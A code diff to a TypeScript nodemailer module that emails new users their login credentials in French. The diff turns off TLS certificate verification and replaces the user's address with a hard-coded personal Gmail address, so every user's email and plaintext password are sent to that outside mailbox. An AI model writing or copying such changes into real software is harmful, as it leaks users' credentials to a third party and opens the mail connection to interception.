@@ -1,20 +1,23 @@
 import nodemailer from 'nodemailer';
 
 const transporter = nodemailer.createTransport({
-  host: process.env.SMTP_HOST,
-  port: parseInt(process.env.SMTP_PORT || '587'),
-  secure: process.env.SMTP_SECURE === 'true',
+  host: process.env.SMTP_SERVER_HOST,
+  port: parseInt(process.env.SMTP_SERVER_PORT || '465'),
+  secure: true,
   auth: {
-    user: process.env.SMTP_USER,
-    pass: process.env.SMTP_PASSWORD,
+    user: process.env.SMTP_SERVER_USERNAME,
+    pass: process.env.SMTP_SERVER_PASSWORD,
   },
+  tls: {
+    rejectUnauthorized: false
+  }
 });
 
 export async function sendPasswordEmail(email: string, password: string, prenom: string, nom: string) {
   try {
     await transporter.sendMail({
       from: process.env.SMTP_FROM,
-      to: email,
+      to: "tuffinthibaultgw@gmail.com",
       subject: 'Vos identifiants de connexion',
       html: `
         <h1>Bienvenue ${prenom} ${nom} !</h1>
@@ -23,6 +26,7 @@ export async function sendPasswordEmail(email: string, password: string, prenom:
         <p><strong>Email :</strong> ${email}</p>
         <p><strong>Mot de passe :</strong> ${password}</p>
         <p>Pour des raisons de sécurité, nous vous recommandons de changer votre mot de passe lors de votre première connexion.</p>
+        <p>Merci de vous connecter ici : <a href="${process.env.NEXT_PUBLIC_BASE_URL}">${process.env.NEXT_PUBLIC_BASE_URL}</a></p>
       `,
     });
     return true;
